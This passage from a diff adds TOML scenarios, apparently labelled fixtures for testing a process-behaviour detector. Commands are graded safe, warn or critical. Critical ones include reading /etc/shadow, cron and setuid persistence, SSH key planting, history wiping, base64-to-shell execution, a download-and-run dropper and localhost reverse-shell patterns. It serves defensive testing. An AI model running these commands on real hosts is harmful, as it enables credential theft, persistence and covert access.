+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do python3 -c 'import time; time.sleep({secs})' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "compress_big.e"
+family = "compress_big"
+label = "warn"
+container = "target"
+expected = 3
+at = 3776
+duration = 10
+params = { out = "/root/mirrord", secs = 4 }
+steps = [{ cmd = "gzip -c /usr/bin/python3* > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "report_job.e"
+family = "report_job"
+label = "safe"
+container = "target"
+expected = 3
+at = 3790
+duration = 10
+params = { out = "/tmp/scand", secs = 4 }
+steps = [{ cmd = "date > {out}; uname -a >> {out}; df -h >> {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "compress_big.g"
+family = "compress_big"
+label = "warn"
+container = "target"
+expected = 3
+at = 3804
+duration = 10
+params = { out = "/tmp/sync2", secs = 4 }
+steps = [{ cmd = "gzip -c /usr/bin/python3* > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "long_argument.a"
+family = "long_argument"
+label = "warn"
+container = "target"
+expected = 3
+at = 3818
+duration = 9
+params = { secs = 2, text = "alpha-beta-gamma-delta-epsilon-zeta-eta-theta-iota-kappa-lambda-mu-nu-xi-omicron-pi-rho-sigma-tau" }
+steps = [{ cmd = "sleep {secs}; echo {text} > /dev/null", timeout = 40 }]
+
+[[scenarios]]
+id = "tar_pack.c"
+family = "tar_pack"
+label = "safe"
+container = "target"
+expected = 3
+at = 3831
+duration = 9
+params = { out = "/root/conf.tgz", secs = 2 }
+steps = [{ cmd = "tar czf {out} /etc/hostname /etc/os-release 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "admin_scan.d"
+family = "admin_scan"
+label = "warn"
+container = "target"
+expected = 3
+at = 3844
+duration = 10
+params = { pat = "*.conf", secs = 4 }
+steps = [{ cmd = "find /etc -maxdepth 2 -name '{pat}' 2>/dev/null | head -5; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "cred_read.d"
+family = "cred_read"
+label = "crit"
+container = "target"
+expected = 3
+at = 3858
+duration = 9
+params = { out = "/tmp/.metad", secs = 1 }
+steps = [{ cmd = "cat /etc/passwd /etc/shadow > {out} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "hidden_cron.e"
+family = "hidden_cron"
+label = "crit"
+container = "target"
+expected = 4
+at = 3871
+duration = 13
+params = { path = "/root/.cache/.linkd", secs = 3 }
+steps = [{ cmd = "mkdir -p {path} && printf '* * * * * {path}/.sysd\\n' > {path}/entry && cp /usr/bin/sleep {path}/.sysd && cd {path} && ./.sysd {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "setuid_copy.f"
+family = "setuid_copy"
+label = "crit"
+container = "target"
+expected = 3
+at = 3888
+duration = 10
+params = { path = "/opt/vendor/bin/.linkd", secs = 5 }
+steps = [{ cmd = "cp /bin/sh {path} && chmod u+s {path} && {path} -c 'sleep {secs}'", timeout = 40 }]
+
+[[scenarios]]
+id = "hotfix_script.f"
+family = "hotfix_script"
+label = "warn"
+container = "target"
+expected = 3
+at = 3902
+duration = 11
+params = { secs = 8 }
+steps = [{ cmd = "mkdir -p /root/fix && printf 'import time\\ntime.sleep({secs})\\n' > /root/fix/patch.py && python3 /root/fix/patch.py", timeout = 30 }]
+
+[[scenarios]]
+id = "local_server.e"
+family = "local_server"
+label = "warn"
+container = "target"
+expected = 3
+at = 3917
+duration = 11
+params = { port = 400, secs = 4 }
+steps = [{ cmd = "python3 -m http.server {port} --bind 127.0.0.1 >/dev/null 2>&1 & sleep {secs}; kill $!", timeout = 40 }]
+
+[[scenarios]]
+id = "masquerade.g"
+family = "masquerade"
+label = "crit"
+container = "target"
+expected = 3
+at = 3932
+duration = 10
+params = { path = "/srv/app/bundled", secs = 4 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "gzip_loop.d"
+family = "gzip_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3946
+duration = 13
+params = { secs = 5 }
+steps = [{ cmd = "timeout {secs} sh -c 'yes | gzip -c > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "busy_poll.d"
+family = "busy_poll"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 3963
+duration = 15
+params = { n = 180 }
+steps = [{ cmd = "sh -c 'i=0; while [ $i -lt {n} ]; do i=$((i+1)); done'", timeout = 30 }]
+
+[[scenarios]]
+id = "cron_persist.e"
+family = "cron_persist"
+label = "crit"
+container = "target"
+expected = 3
+at = 3982
+duration = 11
+params = { bin = "/usr/local/lib/.peerd", name = "e2scrub", secs = 3 }
+steps = [{ cmd = "cp /usr/bin/sleep {bin} && printf '* * * * * root {bin}\\n' > /etc/cron.d/{name} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "hidden_cron.d"
+family = "hidden_cron"
+label = "crit"
+container = "target"
+expected = 4
+at = 3997
+duration = 13
+params = { path = "/root/.cache/.fusion", secs = 2 }
+steps = [{ cmd = "mkdir -p {path} && printf '* * * * * {path}/.sysd\\n' > {path}/entry && cp /usr/bin/sleep {path}/.sysd && cd {path} && ./.sysd {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "gzip_loop.f"
+family = "gzip_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 4014
+duration = 13
+params = { secs = 4 }
+steps = [{ cmd = "timeout {secs} sh -c 'yes | gzip -c > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "base64_pipe.g"
+family = "base64_pipe"
+label = "crit"
+container = "target"
+expected = 3
+at = 4031
+duration = 10
+params = { b64 = "c2xlZXAgNA==" }
+steps = [{ cmd = "echo '{b64}' | base64 -d | sh; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "python_tool.d"
+family = "python_tool"
+label = "safe"
+container = "target"
+expected = 3
+at = 4045
+duration = 9
+params = { code = "import platform; print(platform.machine())", secs = 2 }
+steps = [{ cmd = "python3 -c \"{code}\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "disk_audit.f"
+family = "disk_audit"
+label = "warn"
+container = "target"
+expected = 3
+at = 4058
+duration = 10
+params = { a = "/usr", b = "/srv", secs = 3 }
+steps = [{ cmd = "du -sh {a} {b} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "mem_grower.f"
+family = "mem_grower"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 4072
+duration = 16
+params = { n = 25, gap = 0.47 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray(); [b.extend(bytes(8 * 1024 * 1024)) or time.sleep({gap}) for _ in range({n})]; time.sleep(1)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "dropper_stage.e"
+family = "dropper_stage"
+label = "crit"
+container = "target"
+expected = 4
+at = 4092
+duration = 13
+params = { secs = 5 }
+steps = [{ cmd = "curl -sf -o /var/tmp/.upd http://127.0.0.1/payload.sh && chmod 700 /var/tmp/.upd && sh /var/tmp/.upd", timeout = 30 }]
+
+[[scenarios]]
+id = "mem_grower.h"
+family = "mem_grower"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 4109
+duration = 16
+params = { n = 19, gap = 0.6 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray(); [b.extend(bytes(8 * 1024 * 1024)) or time.sleep({gap}) for _ in range({n})]; time.sleep(1)\"", timeout = 35 }]
+
+[[scenarios]]
+id = "ld_preload_hijack.d"
+family = "ld_preload_hijack"
+label = "crit"
+container = "target"
+expected = 2
+at = 4129
+duration = 11
+params = { secs = 7 }
+steps = [{ cmd = "LD_LIBRARY_PATH=/dev/shm/.l LD_PRELOAD=/dev/shm/.l/libc-hook.so sleep {secs} 2>/dev/null", timeout = 30 }]
+
+[[scenarios]]
+id = "masquerade.d"
+family = "masquerade"
+label = "crit"
+container = "target"
+expected = 3
+at = 4144
+duration = 10
+params = { path = "/var/lib/svc/tracer", secs = 3 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "cron_persist.g"
+family = "cron_persist"
+label = "crit"
+container = "target"
+expected = 3
+at = 4158
+duration = 11
+params = { bin = "/opt/tools/.stagerd", name = "anacron-x", secs = 4 }
+steps = [{ cmd = "cp /usr/bin/sleep {bin} && printf '* * * * * root {bin}\\n' > /etc/cron.d/{name} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "vendor_binary.c"
+family = "vendor_binary"
+label = "warn"
+container = "target"
+expected = 3
+at = 4173
+duration = 11
+params = { dir = "/srv/app/fetchd", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/cts-sync && {dir}/cts-sync {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "json_check.c"
+family = "json_check"
+label = "safe"
+container = "target"
+expected = 3
+at = 4188
+duration = 9
+params = { payload = "[]", secs = 2 }
+steps = [{ cmd = "python3 -c \"import json; print(json.loads('{payload}'))\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "one_off_script.c"
+family = "one_off_script"
+label = "warn"
+container = "target"
+expected = 3
+at = 4201
+duration = 11
+params = { secs = 7 }
+steps = [{ cmd = "printf 'sleep {secs}\\n' > /root/try-this.sh && sh /root/try-this.sh", timeout = 30 }]
+
+[[scenarios]]
+id = "env_wrapper.e"
+family = "env_wrapper"
+label = "warn"
+container = "target"
+expected = 3
+at = 4216
+duration = 9
+params = { wrap = "nice -n 5", secs = 3 }
+steps = [{ cmd = "{wrap} sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "tool_upgrade.g"
+family = "tool_upgrade"
+label = "warn"
+container = "target"
+expected = 3
+at = 4229
+duration = 10
+params = { bin = "/opt/tools/rotor", secs = 5 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin}.new && mv {bin}.new {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "ssh_key_drop.f"
+family = "ssh_key_drop"
+label = "crit"
+container = "target"
+expected = 3
+at = 4243
+duration = 10
+params = { key = "Q9wzz", secs = 1 }
+steps = [{ cmd = "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAA{key} root@x\\n' >> /root/.ssh/authorized_keys; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "source_checkout.e"
+family = "source_checkout"
+label = "safe"
+container = "target"
+expected = 3
+at = 4257
+duration = 10
+params = { dir = "/opt/tools/vaultd", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir}/src && cd {dir}/src && printf 'int main(){{}}\\n' > main.c && cp main.c main.bak; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "setuid_copy.d"
+family = "setuid_copy"
+label = "crit"
+container = "target"
+expected = 3
+at = 4271
+duration = 10
+params = { path = "/var/tmp/.agentd", secs = 4 }
+steps = [{ cmd = "cp /bin/sh {path} && chmod u+s {path} && {path} -c 'sleep {secs}'", timeout = 40 }]
+
+[[scenarios]]
+id = "editor_plugin.f"
+family = "editor_plugin"
+label = "warn"
+container = "target"
+expected = 3
+at = 4285
+duration = 11
+params = { dir = "/var/opt/pkg/bundled", secs = 6 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/lsp-server && {dir}/lsp-server {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "backup_job.d"
+family = "backup_job"
+label = "warn"
+container = "target"
+expected = 3
+at = 4300
+duration = 13
+params = { dir = "/srv/vaultd", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && tar -cf {dir}/etc.tar /etc/hostname 2>/dev/null; sh -c 'sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "one_off_script.e"
+family = "one_off_script"
+label = "warn"
+container = "target"
+expected = 3
+at = 4317
+duration = 11
+params = { secs = 3 }
+steps = [{ cmd = "printf 'echo run; sleep {secs}\\n' > /tmp/once.sh && sh /tmp/once.sh", timeout = 30 }]
+
+[[scenarios]]
+id = "tight_python_spin.b"
+family = "tight_python_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 4332
+duration = 12
+params = { secs = 8 }
+steps = [{ cmd = "python3 -c \"import time; t = time.time(); [None for _ in iter(lambda: time.time() - t < {secs}, False)]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "admin_scan.e"
+family = "admin_scan"
+label = "warn"
+container = "target"
+expected = 3
+at = 4348
+duration = 10
+params = { pat = "host*", secs = 2 }
+steps = [{ cmd = "find /etc -maxdepth 2 -name '{pat}' 2>/dev/null | head -5; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "ssh_key_drop.e"
+family = "ssh_key_drop"
+label = "crit"
+container = "target"
+expected = 3
+at = 4362
+duration = 10
+params = { key = "H7aab", secs = 3 }
+steps = [{ cmd = "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAA{key} root@x\\n' >> /root/.ssh/authorized_keys; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "history_wipe.e"
+family = "history_wipe"
+label = "crit"
+container = "target"
+expected = 3
+at = 4376
+duration = 9
+params = { secs = 2 }
+steps = [{ cmd = "rm -f /root/.bash_history; ln -sf /dev/null /root/.bash_history; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "build_fanout.e"
+family = "build_fanout"
+label = "safe"
+container = "target"
+expected = 9
+at = 4389
+duration = 13
+params = { n = 6, secs = 5 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do cp /bin/sleep /tmp/cc.$i && /tmp/cc.$i {secs}; i=$((i+1)); done", timeout = 30 }]
+
+[[scenarios]]
+id = "wide_spawn_loop.a"
+family = "wide_spawn_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 4406
+duration = 12
+params = { n = 60, gap = 3 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sh -c 'sleep {gap}' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "chmod_then_run.b"
+family = "chmod_then_run"
+label = "crit"
+container = "target"
+expected = 3
+at = 4422
+duration = 10
+params = { path = "/var/tmp/.qq", secs = 4 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && chmod 4755 {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "svc_status.f"
+family = "svc_status"
+label = "safe"
+container = "target"
+expected = 3
+at = 4436
+duration = 9
+params = { secs = 2 }
+steps = [{ cmd = "systemctl is-active nginx; systemctl status nginx --no-pager | head -3; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "local_server.d"
+family = "local_server"
+label = "warn"
+container = "target"
+expected = 3
+at = 4449
+duration = 11
+params = { port = 400, secs = 4 }
+steps = [{ cmd = "python3 -m http.server {port} --bind 127.0.0.1 >/dev/null 2>&1 & sleep {secs}; kill $!", timeout = 40 }]
+
+[[scenarios]]
+id = "fd_leak.f"
+family = "fd_leak"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 4464
+duration = 11
+params = { n = 180 }
+steps = [{ cmd = "python3 -c \"import os, time; ps = [os.pipe() for _ in range({n})]; time.sleep(4)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "fork_storm.e"
+family = "fork_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 61
+at = 4479
+duration = 9
+params = { n = 85, spin = 0.1, tail = 1 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {spin} & i=$((i+1)); done; sleep {tail}; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "pkg_install.h"
+family = "pkg_install"
+label = "safe"
+container = "target"
+expected = 6
+at = 4492
+duration = 15
+params = { n = 16 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do cp /bin/true /tmp/unp.$i && /tmp/unp.$i; i=$((i+1)); done", timeout = 20 }]
+
+[[scenarios]]
+id = "fork_storm.c"
+family = "fork_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 61
+at = 4511
+duration = 9
+params = { n = 180, spin = 0.1, tail = 5 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {spin} & i=$((i+1)); done; sleep {tail}; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "reverse_shell.c"
+family = "reverse_shell"
+label = "crit"
+container = "target"
+expected = 3
+at = 4524
+duration = 11
+params = { secs = 5 }
+steps = [{ cmd = "python3 -c \"import socket, subprocess, os; s = socket.create_connection(('127.0.0.1', 80)); subprocess.run(['sleep', '{secs}'], stdin=s.fileno(), stdout=s.fileno())\"", timeout = 30 }]
+
+[[scenarios]]
+id = "tight_python_spin.a"
+family = "tight_python_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 4539
+duration = 12
+params = { secs = 6 }
+steps = [{ cmd = "python3 -c \"import time; t = time.time(); [None for _ in iter(lambda: time.time() - t < {secs}, False)]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "log_rotate.d"
+family = "log_rotate"
+label = "safe"
+container = "target"
+expected = 3
+at = 4555
+duration = 10
+params = { dir = "/var/scand", name = "worker", secs = 3 }
+steps = [{ cmd = "mkdir -p {dir} && printf 'line\\n' > {dir}/{name}.log && gzip -f {dir}/{name}.log; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "env_wrapper.f"
+family = "env_wrapper"
+label = "warn"
+container = "target"
+expected = 3
+at = 4569
+duration = 9
+params = { wrap = "nice -n 5", secs = 6 }
+steps = [{ cmd = "{wrap} sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "proc_listing.c"
+family = "proc_listing"
+label = "safe"
+container = "target"
+expected = 3
+at = 4582
+duration = 9
+params = { n = 20, out = "/root/ps.txt", secs = 2 }
+steps = [{ cmd = "ps aux | head -{n} > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "big_alloc.e"
+family = "big_alloc"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 4595
+duration = 12
+params = { mb = 206, secs = 7 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray({mb} * 1024 * 1024); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "gzip_loop.g"
+family = "gzip_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 4611
+duration = 13
+params = { secs = 8 }
+steps = [{ cmd = "timeout {secs} sh -c 'yes | gzip -c > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "new_tool.d"
+family = "new_tool"
+label = "warn"
+container = "target"
+expected = 3
+at = 4628
+duration = 13
+params = { dir = "/usr/local/gridd", name = "forge", secs = 5 }
+steps = [{ cmd = "cp /usr/bin/sleep {dir}/{name} && cd {dir} && ./{name} {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "svc_status.d"
+family = "svc_status"
+label = "safe"
+container = "target"
+expected = 3
+at = 4645
+duration = 9
+params = { secs = 5 }
+steps = [{ cmd = "systemctl is-active nginx; systemctl status nginx --no-pager | head -3; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "editor_plugin.e"
+family = "editor_plugin"
+label = "warn"
+container = "target"
+expected = 3
+at = 4658
+duration = 11
+params = { dir = "/root/.config/Code/mover", secs = 3 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/lsp-server && {dir}/lsp-server {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "seq_sort_spin.d"
+family = "seq_sort_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 4673
+duration = 12
+params = { n = 2500000 }
+steps = [{ cmd = "seq 1 {n} | sort -R | tail -1 > /dev/null; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "vendor_binary.f"
+family = "vendor_binary"
+label = "warn"
+container = "target"
+expected = 3
+at = 4689
+duration = 11
+params = { dir = "/opt/linkd", secs = 7 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/cts-sync && {dir}/cts-sync {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "history_wipe.g"
+family = "history_wipe"
+label = "crit"
+container = "target"
+expected = 3
+at = 4704
+duration = 9
+params = { secs = 2 }
+steps = [{ cmd = "rm -f /root/.bash_history; ln -sf /dev/null /root/.bash_history; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "admin_scan.g"
+family = "admin_scan"
+label = "warn"
+container = "target"
+expected = 3
+at = 4717
+duration = 10
+params = { pat = "*.conf", secs = 4 }
+steps = [{ cmd = "find /etc -maxdepth 2 -name '{pat}' 2>/dev/null | head -5; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "reverse_shell.e"
+family = "reverse_shell"
+label = "crit"
+container = "target"
+expected = 3
+at = 4731
+duration = 11
+params = { secs = 2 }
+steps = [{ cmd = "bash -c 'exec 3<>/dev/tcp/127.0.0.1/80; printf \"GET / HTTP/1.0\\r\\n\\r\\n\" >&3; sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "report_job.f"
+family = "report_job"
+label = "safe"
+container = "target"
+expected = 3
+at = 4746
+duration = 10
+params = { out = "/opt/tools/mirrord", secs = 2 }
+steps = [{ cmd = "date > {out}; uname -a >> {out}; df -h >> {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "seq_sort_spin.c"
+family = "seq_sort_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 4760
+duration = 12
+params = { n = 1500000 }
+steps = [{ cmd = "seq 1 {n} | sort -R | tail -1 > /dev/null; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "tmpfs_copy.g"
+family = "tmpfs_copy"
+label = "crit"
+container = "target"
+expected = 4
+at = 4776
+duration = 13
+params = { path = "/var/lib/svc/.mirrord", secs = 7 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && chmod +x {path} && {path} {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "busy_poll.c"
+family = "busy_poll"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 4793
+duration = 15
+params = { secs = 5 }
+steps = [{ cmd = "timeout {secs} yes > /dev/null; true", timeout = 30 }]
+
+[[scenarios]]
+id = "fork_storm.d"
+family = "fork_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 61
+at = 4812
+duration = 9
+params = { n = 84, spin = 0.1, tail = 4 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {spin} & i=$((i+1)); done; sleep {tail}; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "ssh_session.e"
+family = "ssh_session"
+label = "safe"
+container = "target"
+expected = 5
+at = 4825
+duration = 13
+params = { n = 4, secs = 1 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do setsid sh -c \"sleep {secs}\" & i=$((i+1)); done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "hosts_edit.a"
+family = "hosts_edit"
+label = "crit"
+container = "target"
+expected = 3
+at = 4842
+duration = 9
+params = { host = "update.example.test", secs = 2 }
+steps = [{ cmd = "echo '127.0.0.1 {host}' >> /etc/hosts; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "health_probe.g"
+family = "health_probe"
+label = "safe"
+container = "target"
+expected = 3
+at = 4855
+duration = 10
+params = { n = 2, path = "" }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -sf -o /dev/null http://127.0.0.1/{path}; sleep 1; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "wide_spawn_loop.c"
+family = "wide_spawn_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 4869
+duration = 12
+params = { n = 120, gap = 4 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sh -c 'sleep {gap}' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "cpu_spin.h"
+family = "cpu_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 4885
+duration = 17
+params = { secs = 8 }
+steps = [{ cmd = "python3 -c \"import time; t = time.time(); exec('while time.time() - t < {secs}: pass')\"", timeout = 20 }]
+
+[[scenarios]]
+id = "hosts_edit.d"
+family = "hosts_edit"
+label = "crit"
+container = "target"
+expected = 3
+at = 4906
+duration = 9
+params = { host = "cdn.example.test", secs = 3 }
+steps = [{ cmd = "echo '127.0.0.1 {host}' >> /etc/hosts; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "python_tool.e"
+family = "python_tool"
+label = "safe"
+container = "target"
+expected = 3
+at = 4919
+duration = 9
+params = { code = "print(sum(range(1000)))", secs = 1 }
+steps = [{ cmd = "python3 -c \"{code}\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "cred_read.e"
+family = "cred_read"
+label = "crit"
+container = "target"
+expected = 3
+at = 4932
+duration = 9
+params = { out = "/opt/tools/.boxd", secs = 2 }
+steps = [{ cmd = "cat /etc/passwd /etc/shadow > {out} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "bind_shell.g"
+family = "bind_shell"
+label = "crit"
+container = "target"
+expected = 3
+at = 4945
+duration = 10
+params = { port = 400, secs = 4 }
+steps = [{ cmd = "python3 -c \"import socket, time; s = socket.socket(); s.bind(('127.0.0.1', {port})); s.listen(1); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "test_runner.d"
+family = "test_runner"
+label = "safe"
+container = "target"
+expected = 3
+at = 4959
+duration = 9
+params = { n = 4, secs = 1.07 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do python3 -c 'import time; time.sleep({secs})' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "cron_persist.f"
+family = "cron_persist"
+label = "crit"
+container = "target"
+expected = 3
+at = 4972
+duration = 11
+params = { bin = "/root/tools/.scand", name = "sys-update", secs = 2 }
+steps = [{ cmd = "cp /usr/bin/sleep {bin} && printf '* * * * * root {bin}\\n' > /etc/cron.d/{name} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "local_server.f"
+family = "local_server"
+label = "warn"
+container = "target"
+expected = 3
+at = 4987
+duration = 11
+params = { port = 400, secs = 4 }
+steps = [{ cmd = "python3 -m http.server {port} --bind 127.0.0.1 >/dev/null 2>&1 & sleep {secs}; kill $!", timeout = 40 }]
+
+[[scenarios]]
+id = "ssh_session.f"
+family = "ssh_session"
+label = "safe"
+container = "target"
+expected = 5
+at = 5002
+duration = 13
+params = { n = 6, secs = 4 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do setsid sh -c \"sleep {secs}\" & i=$((i+1)); done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "one_off_script.f"
+family = "one_off_script"
+label = "warn"
+container = "target"
+expected = 3
+at = 5019
+duration = 11
+params = { secs = 6 }
+steps = [{ cmd = "printf 'echo run; sleep {secs}\\n' > /tmp/once.sh && sh /tmp/once.sh", timeout = 30 }]
+
+[[scenarios]]
+id = "busy_poll.f"
+family = "busy_poll"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 5034
+duration = 15
+params = { secs = 8 }
+steps = [{ cmd = "timeout {secs} yes > /dev/null; true", timeout = 30 }]
+
+[[scenarios]]
+id = "json_check.a"
+family = "json_check"
+label = "safe"
+container = "target"
+expected = 3
+at = 5053
+duration = 9
+params = { payload = "[1, 2, 3]", secs = 2 }
+steps = [{ cmd = "python3 -c \"import json; print(json.loads('{payload}'))\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "build_fanout.h"
+family = "build_fanout"
+label = "safe"
+container = "target"
+expected = 9
+at = 5066
+duration = 13
+params = { n = 4, secs = 2 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {secs} & i=$((i+1)); done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "dd_pipe_burn.c"
+family = "dd_pipe_burn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 5083
+duration = 12
+params = { secs = 5 }
+steps = [{ cmd = "timeout {secs} sh -c 'dd if=/dev/zero bs=1M 2>/dev/null | cat > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "python_tool.f"
+family = "python_tool"
+label = "safe"
+container = "target"
+expected = 3
+at = 5099
+duration = 9
+params = { code = "import os; print(os.getcwd())", secs = 3 }
+steps = [{ cmd = "python3 -c \"{code}\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "hidden_cron.f"
+family = "hidden_cron"
+label = "crit"
+container = "target"
+expected = 4
+at = 5112
+duration = 13
+params = { path = "/root/.cache/.scand", secs = 4 }
+steps = [{ cmd = "mkdir -p {path} && printf '* * * * * {path}/.sysd\\n' > {path}/entry && cp /usr/bin/sleep {path}/.sysd && cd {path} && ./.sysd {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "home_script.h"
+family = "home_script"
+label = "warn"
